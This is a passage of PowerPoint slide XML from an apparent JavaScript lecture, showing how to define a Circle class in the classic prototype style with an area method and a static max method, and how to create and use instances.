                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ClassName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(params);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Methods:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ClassName.prototype.method</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = function (params) {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  // method body</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>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744A12F9-3081-4200-8BAF-4F6E54A3E112}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Defining Methods and Properties Classic Style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107523" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12F1EAC3-C87C-4DAA-A145-BA4369DDF543}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983163"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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Circle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class</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constructor</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</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radius</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this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radius</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PI</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Math</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PI</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class</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property</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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instance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method</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which</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returns</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the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area</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>circle</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267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</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prototype</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area</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a: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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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this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this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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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class</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method</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which</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returns</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the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bigger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> radius</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267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</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max</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a: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a</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b</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>b</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b</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49"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302A057-0442-43F8-9B32-74BB1A3081DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Creating Instances and Using Them</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CDF467A2-1F8B-4257-89FA-F0F8DA9DCA5E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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c</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new</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// make a new Circle object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>3.5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// set instance property</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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area</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>area</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// call instance method</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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area</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>twopi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// refer to class property</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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d</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new</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// make another Circle object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</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bigger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>max</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c</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d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
